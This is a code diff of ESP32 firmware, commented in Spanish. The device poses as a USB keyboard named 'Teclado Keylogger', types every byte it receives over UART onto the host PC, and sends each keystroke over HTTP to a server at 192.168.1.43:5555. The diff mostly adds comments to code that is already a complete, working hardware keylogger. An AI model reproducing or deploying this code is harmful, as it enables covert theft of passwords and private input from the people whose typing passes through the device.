@@ -4,29 +4,31 @@
 #include <HTTPClient.h>
 #include "freertos/queue.h"
 
-USBHIDKeyboard Keyboard;
+// ====== Objetos principales ======
+USBHIDKeyboard Keyboard;   // Controlador HID para emular teclado
 
-// Pines UART
+// ====== Configuración UART ======
 #define RX_PIN 18
 #define TX_PIN 17
 #define BAUD_RATE 9600
 
-// WiFi
-const char* ssid     = ""; // Nombre de la red WiFi
-const char* password = ""; // Contraseña de la red WiFi
+// ====== Configuración WiFi ======
+const char* ssid     = "";  // Nombre de la red WiFi
+const char* password = "";  // Contraseña de la red WiFi
 
-// Servidor local
-const char* serverURL = "http://192.168.1.43:5555/key"; // Ajusta IP/puerto según el servidor
+// ====== Configuración del servidor ======
+const char* serverURL = "http://192.168.1.43:5555/key";  // IP y puerto del servidor receptor
 
-// Comandos especiales
+// ====== Comandos especiales (no ASCII) ======
 #define CMD_ESC        0x1B
 #define CMD_TAB        0x09
 #define CMD_CAPS       0x14
 #define CMD_BACKSPACE  0x08
 #define CMD_ENTER      0x0A
 #define CMD_GUI        0x90
-#define CMD_ALTGR      0x92 // AltGr
+#define CMD_ALTGR      0x92   // AltGr (Right Alt)
 
+// ====== Tabla de equivalencias de comandos ======
 typedef struct {
   uint8_t command;
   uint8_t keycode;
@@ -42,17 +44,23 @@ CommandMap commandMap[] = {
 
 const uint8_t commandCount = sizeof(commandMap) / sizeof(CommandMap);
 
-// ====== Cola para teclas ======
+// ====== Cola para envío de teclas al servidor ======
 QueueHandle_t keyQueue;
 
-// ====== Envío en segundo plano ======
+// =====================================================================
+// ====================== TAREA DE ENVÍO AL SERVIDOR ===================
+// =====================================================================
+// Esta tarea corre en segundo plano. Toma las teclas de la cola y las
+// envía al servidor HTTP de forma ordenada y no bloqueante.
+// =====================================================================
 void serverTask(void* parameter) {
   String key;
   for (;;) {
     if (xQueueReceive(keyQueue, &key, portMAX_DELAY) == pdTRUE) {
       if (WiFi.status() == WL_CONNECTED) {
         HTTPClient http;
-        http.setTimeout(1000);  // 1s máximo
+        http.setTimeout(1000);  // Timeout máximo 1s
+
         if (http.begin(serverURL)) {
           http.addHeader("Content-Type", "application/json");
           String json = "{\"key\":\"" + key + "\"}";
@@ -64,16 +72,22 @@ void serverTask(void* parameter) {
   }
 }
 
-// ====== HID ======
+// =====================================================================
+// ========================== CONTROL HID ===============================
+// =====================================================================
+
+// Simula la pulsación y liberación de una tecla
 void pressAndRelease(uint8_t key) {
   Keyboard.press(key);
   Keyboard.release(key);
 }
 
+// Envía la tecla a la cola para que el servidor la procese luego
 void sendLater(const String& key) {
-  xQueueSend(keyQueue, &key, 0); // no bloquea, si la cola está llena se descarta
+  xQueueSend(keyQueue, &key, 0);  // No bloquea, descarta si la cola está llena
 }
 
+// Verifica si el byte recibido es un comando especial
 bool isSpecialCommand(uint8_t cmd) {
   if (cmd == CMD_GUI || cmd == CMD_ALTGR) return true;
   for (int i = 0; i < commandCount; i++) {
@@ -82,6 +96,7 @@ bool isSpecialCommand(uint8_t cmd) {
   return false;
 }
 
+// Ejecuta acciones según el comando especial recibido
 void handleSpecialCommand(uint8_t cmd) {
   for (int i = 0; i < commandCount; i++) {
     if (cmd == commandMap[i].command) {
@@ -90,28 +105,36 @@ void handleSpecialCommand(uint8_t cmd) {
       return;
     }
   }
+
+  // Tecla GUI (Windows)
   if (cmd == CMD_GUI) {
     pressAndRelease(KEY_LEFT_GUI);
     sendLater("GUI");
   }
+
+  // Tecla AltGr
   if (cmd == CMD_ALTGR) {
     pressAndRelease(KEY_RIGHT_ALT);
     sendLater("ALTGR");
   }
 }
 
-// ====== Setup ======
+// =====================================================================
+// ============================ SETUP ==================================
+// =====================================================================
 void setup() {
+  // Inicializar UART secundaria
   Serial1.begin(BAUD_RATE, SERIAL_8N1, RX_PIN, TX_PIN);
   
-  // Nombre personalizado del dispositivo
+  // Personalizar nombre del dispositivo USB
   USB.productName("Teclado Keylogger");
   USB.begin();
 
+  // Inicializar teclado HID
   Keyboard.begin();
   delay(500);
 
-  // Conexión WiFi (intento simple con timeout)
+  // Intentar conexión WiFi (20 intentos)
   WiFi.begin(ssid, password);
   int retries = 0;
   while (WiFi.status() != WL_CONNECTED && retries < 20) {
@@ -119,33 +142,41 @@ void setup() {
     retries++;
   }
 
-  // Crear cola y tarea para envíos
+  // Crear cola y tarea para el envío de teclas al servidor
   keyQueue = xQueueCreate(32, sizeof(String));
   xTaskCreatePinnedToCore(serverTask, "ServerTask", 4096, NULL, 1, NULL, 1);
 }
 
-// ====== Loop ======
+// =====================================================================
+// ============================= LOOP ==================================
+// =====================================================================
+// Lee bytes del UART, interpreta si son comandos especiales o teclas
+// normales, y los envía al PC (como teclado) y al servidor (por HTTP).
+// =====================================================================
 void loop() {
   if (Serial1.available()) {
     uint8_t c = Serial1.read();
 
+    // Comando especial (ESC, TAB, GUI, etc.)
     if (isSpecialCommand(c)) {
       handleSpecialCommand(c);
-    } else {
-      if (c >= 0x20 && c <= 0x7E) {
-        // Caso especial para '@' en teclado ES-LA
-        if (c == '@') {
-          Keyboard.press(KEY_RIGHT_ALT);  
-          Keyboard.press('q');            
-          Keyboard.release('q');
-          Keyboard.release(KEY_RIGHT_ALT);
-          sendLater("@");
-        } else {
-          Keyboard.write((char)c);
-          sendLater(String((char)c));
-        }
+    } 
+    // Caracter ASCII imprimible
+    else if (c >= 0x20 && c <= 0x7E) {
+      // Caso especial: '@' en layout español-latino
+      if (c == '@') {
+        Keyboard.press(KEY_RIGHT_ALT);
+        Keyboard.press('q');
+        Keyboard.release('q');
+        Keyboard.release(KEY_RIGHT_ALT);
+        sendLater("@");
+      } else {
+        Keyboard.write((char)c);
+        sendLater(String((char)c));
       }
     }
   }
-  delay(1); // cede tiempo al planificador
+
+  // Pequeño retardo para ceder tiempo al planificador de FreeRTOS
+  delay(1);
 }
